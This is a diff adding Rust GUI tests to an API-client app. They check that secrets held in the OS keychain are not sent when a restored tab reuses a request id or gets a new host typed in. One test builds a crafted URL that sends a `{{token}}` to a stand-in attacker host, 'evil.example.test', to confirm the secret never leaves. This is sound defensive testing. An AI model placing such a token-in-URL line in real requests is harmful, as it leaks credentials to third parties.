@@ -40,6 +40,7 @@ use request_editor::RequestEditor;
 use request_editor::send::set_http_client;
 use secrets::{MemorySecretStore, SecretError, SecretKey, SecretStore, SecretValue};
 use storage::{LocalStore, LocalValue, OpenTab};
+use ui::components::toast::toast_message_selector;
 use ui::test_support::draw_window;
 use workspace::{Workspace, WorkspaceOpen};
 use workspace_store::{Item, ItemBody};
@@ -1297,5 +1298,184 @@ fn wire_workspace_key_is_short_and_keychain_safe() {
     assert!(
         SecretKey::new(crafted, "scope", "token").is_ok(),
         "a crafted id still yields a valid keychain key"
+    );
+}
+
+/// Save `draft` as the one tab restored at launch — with no folder, as every tab is.
+fn restore_tab(store: &Arc<Mutex<LocalStore>>, draft: &HttpRequest) {
+    store
+        .lock()
+        .expect("the lock is free")
+        .open_tabs()
+        .insert(&OpenTab {
+            workspace_id: pustman::WORKSPACE_ID.to_string(),
+            position: 0,
+            item_id: draft.id.to_string(),
+            pinned: false,
+            draft_json: Some(serde_json::to_value(draft).expect("the draft serializes")),
+        })
+        .expect("the tab row stores");
+}
+
+/// `fixture`'s collection request as its folder holds it.
+fn collection_request(fixture: &Fixture) -> HttpRequest {
+    let snapshot = workspace_store::open(&fixture.root).expect("the fixture folder opens");
+    snapshot
+        .items
+        .into_values()
+        .find_map(|item| match item.body {
+            ItemBody::Request(Request::Http(request)) => Some(request),
+            _ => None,
+        })
+        .expect("the fixture holds a request")
+}
+
+/// Send `editor`, then "Send anyway": the open folder's secret leaves in neither.
+fn assert_never_sends_the_secret(
+    editor: &Entity<RequestEditor>,
+    transport: &FakeTransport,
+    cx: &mut VisualTestContext,
+) {
+    send(editor, cx);
+    assert!(
+        !sent_secret(transport),
+        "the open folder's secret never leaves"
+    );
+    assert!(
+        warns_token(editor, cx),
+        "nothing resolves from the open folder, so the pre-send check warns"
+    );
+    send_anyway(cx);
+    assert!(
+        !sent_secret(transport),
+        "the open folder's secret never leaves, even with Send anyway"
+    );
+}
+
+/// A crafted folder (or a fork) reusing the open folder's request id with its own URL:
+/// the restored tab shares the id, not the request, so it must not bind.
+#[gpui::test]
+fn wire_restored_tab_reusing_a_request_id_with_another_url_never_sends_the_secret(
+    cx: &mut TestAppContext,
+) {
+    let folder_b = fixture_workspace();
+    let store = shared_store();
+    let mut crafted = collection_request(&folder_b);
+    crafted.url = "https://evil.example.test/?t={{token}}".to_string();
+    restore_tab(&store, &crafted);
+    let keychain = memory_keychain(&folder_b, true);
+    let (workspace, transport, cx) = boot(cx, &store, &folder_b, keychain);
+    select_environment(cx, "Alpha");
+
+    let editor = active_editor(&workspace, cx);
+    assert_eq!(
+        cx.read(|cx| editor.read(cx).draft().id),
+        crafted.id,
+        "the restored tab is the one on screen"
+    );
+    assert_never_sends_the_secret(&editor, &transport, cx);
+}
+
+/// A restored draft with no URL is not a new request: its `{{token}}` header came from
+/// wherever it was saved, so a host typed into it later gets none of the open folder's.
+#[gpui::test]
+fn wire_restored_blank_url_draft_never_sends_the_secret_to_a_host_typed_later(
+    cx: &mut TestAppContext,
+) {
+    let folder_b = fixture_workspace();
+    let store = shared_store();
+    let restored = token_request("");
+    restore_tab(&store, &restored);
+    let keychain = memory_keychain(&folder_b, true);
+    let (workspace, transport, cx) = boot(cx, &store, &folder_b, keychain);
+    select_environment(cx, "Alpha");
+
+    let editor = active_editor(&workspace, cx);
+    assert_eq!(
+        cx.read(|cx| editor.read(cx).draft().id),
+        restored.id,
+        "the restored tab is the one on screen"
+    );
+    cx.update(|window, cx| {
+        editor.update(cx, |editor, cx| editor.focus_url_bar(window, cx));
+    });
+    cx.simulate_input(TOKEN_TARGET);
+    cx.run_until_parked();
+    assert_eq!(
+        cx.read(|cx| editor.read(cx).draft().url.clone()),
+        TOKEN_TARGET,
+        "the host was typed into the restored tab"
+    );
+    assert_never_sends_the_secret(&editor, &transport, cx);
+}
+
+/// A restored tab whose URL is its own folder's request's still resolves that folder's
+/// scopes and secret.
+#[gpui::test]
+fn wire_restored_tab_matching_its_request_still_resolves_the_secret(cx: &mut TestAppContext) {
+    let fixture = fixture_workspace();
+    let store = shared_store();
+    let restored = collection_request(&fixture);
+    restore_tab(&store, &restored);
+    let keychain = memory_keychain(&fixture, true);
+    let (workspace, transport, cx) = boot(cx, &store, &fixture, keychain);
+    select_environment(cx, "Alpha");
+
+    let editor = active_editor(&workspace, cx);
+    assert_eq!(
+        cx.read(|cx| editor.read(cx).draft().id),
+        restored.id,
+        "the restored tab is the one on screen"
+    );
+    send(&editor, cx);
+    assert_eq!(warned_names(&editor, cx), None, "every variable resolves");
+    assert!(sent_secret(&transport), "its own folder's secret is sent");
+    assert_eq!(last_url(&transport), format!("{ALPHA_BASE}/pets"));
+}
+
+/// The longest id used as is still keeps the key within 64 characters.
+#[test]
+fn wire_workspace_key_of_a_32_character_id_stays_within_64_characters() {
+    let id = "a".repeat(32);
+    let key = pustman::scope_wiring::workspace_key(&id, Path::new("/x"));
+    assert!(key.len() <= 64, "the key stays short ({key})");
+    let plain = "b".repeat(31);
+    assert!(
+        pustman::scope_wiring::workspace_key(&plain, Path::new("/x")).starts_with(&plain),
+        "a 31-character id is used as is"
+    );
+}
+
+/// A secret the keychain cannot hold is reported even when the folder's key could not
+/// be resolved.
+#[gpui::test]
+fn wire_unkeyable_secret_is_reported_when_the_folder_key_fails(cx: &mut TestAppContext) {
+    let fixture = fixture_workspace();
+    let store = shared_store();
+    let keychain = memory_keychain(&fixture, false);
+    let (workspace, _transport, cx) = boot(cx, &store, &fixture, keychain);
+
+    let mut snapshot = workspace_store::open(&fixture.root).expect("the fixture folder opens");
+    snapshot.root = fixture.root.join("gone");
+    for item in snapshot.items.values_mut() {
+        if let ItemBody::Environment(environment) = &mut item.body
+            && environment.id == fixture.alpha
+        {
+            environment
+                .variables
+                .push(variable("bad\0name", None, VariableKind::Secret));
+        }
+    }
+    let opened = opener(&workspace, cx);
+    cx.update(|_, cx| opened.update(cx, |opener, cx| opener.set_snapshot(snapshot, cx)));
+    cx.run_until_parked();
+    draw_window(cx);
+
+    let message = "The secret variable `bad\u{fffd}name` cannot be kept in the OS keychain — \
+         requests leave it unresolved";
+    assert!(
+        cx.debug_bounds(toast_message_selector(message).leak())
+            .is_some(),
+        "the unkeyable secret is reported"
     );
 }
